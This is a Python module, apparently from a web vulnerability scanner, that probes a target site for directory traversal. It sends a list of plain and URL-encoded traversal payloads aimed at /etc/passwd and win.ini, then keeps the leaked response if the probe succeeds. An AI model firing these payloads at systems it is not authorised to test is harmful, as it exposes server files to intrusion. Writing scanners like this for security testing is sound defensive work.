# scanner/dirtrav.py
"""
目录遍历检测模块（增强版）：
- 构造多种路径穿越 payload，包括 URL 编码、双重编码等
- 检查是否泄露 /etc/passwd 或 win.ini
"""

from urllib.parse import urljoin, urlparse
from utils.requester import get

TRAVERSAL_PATHS = [
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%5c..%5cwindows\\win.ini",
    "%2e%2e%5c%2e%2e%5cwindows\\win.ini",
]

def scan(url, headers, cookies, proxies):
    result = {"found": False, "request": "", "response": ""}
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    for path in TRAVERSAL_PATHS:
        test_url = urljoin(base + '/', path)
        resp = get(test_url, headers=headers, cookies=cookies, proxies=proxies)
        if resp and ("root:" in resp.text or "[fonts]" in resp.text):
            result["found"] = True
            result["request"] = test_url
            result["response"] = resp.text[:5000]
            return result
    return result
